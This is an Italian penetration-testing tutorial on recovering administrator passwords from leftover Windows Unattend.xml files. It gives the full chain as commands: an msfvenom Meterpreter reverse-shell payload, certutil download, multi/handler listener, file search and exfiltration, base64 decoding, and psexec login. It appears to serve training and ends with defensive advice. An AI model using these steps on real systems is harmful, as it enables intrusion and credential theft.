# Ricerca di credenziali nei file Unattended di Windows

In ambienti enterprise, Windows consente di automatizzare molte operazioni ripetitive tramite strumenti come l’**installazione automatica**. Questa modalità viene spesso utilizzata per implementare Windows su molte macchine contemporaneamente o per configurare intere infrastrutture aziendali con impostazioni predefinite. Per farlo, Windows si serve di file XML contenenti tutti i parametri di configurazione.

Questi file, chiamati tipicamente `Unattend.xml` o `Autounattend.xml`, contengono al loro interno molte informazioni sensibili, inclusi i **nomi utente e le password** (in forma codificata) per gli account amministrativi. Il problema nasce quando questi file non vengono eliminati automaticamente dopo il completamento dell’installazione: in tal caso, possono rappresentare un’importante **fonte di credenziali** per un attaccante.

I percorsi comuni dove questi file vengono salvati sono:

- `C:\\Windows\\Panther\\Unattend.xml`
- `C:\\Windows\\Panther\\Autounattend.xml`

> Il percorso può variare a seconda della versione di Windows.

---

## 1 – Accesso iniziale alla macchina target

Non è necessario disporre di privilegi amministrativi per cercare questi file. È sufficiente ottenere una sessione di Meterpreter tramite una **reverse shell**.  
Per iniziare, si genera un payload con `msfvenom` specificando architettura e tipo di connessione:

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IPKali> LPORT=<KaliPORT> -f exe > payload.exe` <br>
generando un payload eseguibile per Windows 64-bit. <br>

Per distribuire il payload, si può usare un semplice web server Python nella directory corrente:

`python -m SimpleHTTPServer 80` ⟶ condivide in HTTP tutti i file presenti nella directory corrente (per Python 2.x). <br>

---

## 2 – Trasferimento del payload alla macchina target

Dalla macchina target, è possibile scaricare il file malevolo ospitato sul web server Kali tramite il comando:

`certutil -urlcache -f http://<IPKali>/payload.exe payload.exe` ⟶ scarica il payload tramite HTTP e lo salva in locale. <br>

> `certutil` è uno strumento nativo di Windows, spesso disponibile anche su sistemi con restrizioni limitate.

---

## 3 – Avvio del listener e ottenimento della sessione

Dalla macchina di attacco si avvia `msfconsole` e si imposta un **multi/handler**:

`use multi/handler` ⟶ carica il listener per la reverse shell. <br>
`set payload windows/x64/meterpreter/reverse_tcp` ⟶ specifica il payload. <br>
`set LHOST <IPKali>` ⟶ IP Kali. <br>
`set LPORT <KaliPORT>` ⟶ porta in ascolto specificata su msfvenom. <br>
`run` ⟶ avvia il listener. <br>

Mentre il listener é attivo, possiamo eseguire il payload precedentemente generato per aprire una reverse shell.

---

## 4 – Ricerca dei file di configurazione

Una volta ottenuta la sessione, ci si sposta nella radice del file system:

`cd C:\\` ⟶ cambia directory alla radice del disco. <br>
`search -f Unattend.xml` ⟶ cerca in tutto il file system i file con quel nome. <br>

Quando viene individuato il file:

`download Unattend.xml` ⟶ scarica il file sulla macchina attaccante. <br>

---

## 5 – Estrazione e decodifica della password

Una volta scaricato il file, è possibile aprirlo per esaminarne il contenuto:

`cat Unattend.xml` ⟶ visualizza il contenuto XML. <br>

La sezione di interesse è simile a questa:
```
<AutoLogon> 
  <Password> 
    <Value>UGFzc3dvcmREaVNpY3VyaXphdGE=</Value> 
    <PlainText>false</PlainText> 
  </Password> 
  <Enabled>true</Enabled> 
  <Username>administrator</Username> </AutoLogon>
```
In questo esempio, la password è codificata in Base64. Per decodificarla:

Copiare il valore tra i tag `<Value>` in un file .txt <br>
per poi successivamente decifrare la password (criptata in base 64) con il comando: <br>
`base64 -d file.txt` <br>
per ottenere la password in chiaro.

## 6 – Accesso con credenziali ottenute
Una volta decodificata la password, possiamo usarla per autenticarsi con psexec.py da Impacket:

`psexec.py <username>@<IP>`⟶ avvia una sessione remota autenticata. <br>

Verrà richiesta la password e dovremmo quindi inserire quella ottenuta dalla decodifica.

Questo metodo consente di ottenere un accesso completo e legittimo con l’account amministrativo, senza dover bypassare controlli ulteriori.

## 7 - Autenticazione dal target

Dopo che avremo trovato la password, possimao anche accedere a quel determinato utente se siamo gia dentro una sessione aperta nel target
usando il comando <br>
`runas.exe /user:<username> cmd` ⟶ avvia cmd con l'utente specificato <br>
che serve per eseguire un programma o comando con le credenziali di un altro utente
 
## Conclusione
La presenza di file Unattend.xml o Autounattend.xml con credenziali codificate rappresenta una minaccia reale in infrastrutture poco gestite. È fondamentale per le aziende eliminare questi file al termine dell’installazione automatica per non esporre l’intero dominio a rischi di compromissione.

